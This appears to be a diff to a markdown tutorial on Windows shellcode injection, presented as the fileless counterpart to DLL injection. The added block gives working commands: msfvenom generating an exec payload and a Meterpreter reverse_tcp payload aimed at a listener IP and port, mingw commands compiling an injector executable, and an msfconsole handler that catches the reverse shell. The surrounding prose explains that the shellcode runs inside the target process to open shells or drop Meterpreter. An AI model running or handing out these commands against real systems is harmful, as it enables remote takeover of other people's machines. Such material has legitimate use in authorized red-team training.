@@ -6,6 +6,17 @@
 
 **Fileless cousin of #13.** You skip the DLL entirely and inject raw machine code (shellcode) into the target process. The shellcode runs inside the target — launches calc, opens a reverse shell, drops Meterpreter, whatever your msfvenom command produced.
 
+```bash
+
+msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c -v shellcode
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.140.132 LPORT=4444 EXITFUNC=thread -f c -v shellcode
+
+x86_64-w64-mingw32-g++ injection2.cpp -o injector64.exe -luser32 -static -s
+i686-w64-mingw32-g++ injection2.cpp -o injector32.exe -luser32 -static -s
+
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
+```
+
 If #13 is "shove a DLL into a process", #20 is "shove the machine code directly, no DLL needed."
 
 ## Why it works
